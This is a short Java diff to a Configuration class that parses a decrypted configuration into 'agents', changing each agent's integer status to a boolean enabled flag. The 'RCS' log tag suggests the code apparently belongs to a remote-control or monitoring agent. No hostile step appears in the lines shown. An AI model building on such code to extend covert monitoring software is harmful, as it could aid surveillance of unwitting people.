@@ -202,7 +202,7 @@ public class Configuration {
 		// Get id, status, parameters length and parameters
 		for (int i = 0; i < agentNum; i++) {
 			final int id = wrappedClearConf.getInt();
-			final int status = wrappedClearConf.getInt();
+			final boolean enabled = wrappedClearConf.getInt() == 1;
 			final int plen = wrappedClearConf.getInt();
 
 			final byte[] params = new byte[plen];
@@ -211,10 +211,10 @@ public class Configuration {
 				wrappedClearConf.get(params, 0, plen);
 			}
 
-			Log.d("RCS", "Agent: " + id + " Status: " + status
+			Log.d("RCS", "Agent: " + id + " Enabled: " + enabled
 					+ " Params Len: " + plen);
 
-			final Agent a = new Agent(id, status, params);
+			final Agent a = new Agent(id, enabled, params);
 			statusObj.addAgent(a);
 		}
 
